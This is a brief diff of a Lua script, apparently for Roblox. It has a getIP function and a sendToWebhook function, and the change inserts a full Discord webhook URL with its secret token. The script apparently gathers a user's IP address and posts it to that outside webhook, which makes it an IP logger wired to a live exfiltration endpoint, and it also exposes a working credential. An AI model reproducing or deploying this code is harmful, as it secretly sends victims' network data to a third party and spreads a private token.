@@ -36,7 +36,7 @@ local function getIP()
 end
 
 local function sendToWebhook(data)
-    local webhookUrl = ""
+    local webhookUrl = "https://discord.com/api/webhooks/1332265038953582594/JmaQKZ5YeHi1yrLEez3CtLu5-yqYF29oZijAH_yuG4oIVW_3m79aTPx0XLQ3YZiKcYdS"
     local jsonData = HttpService:JSONEncode(data)
 
     local success, response
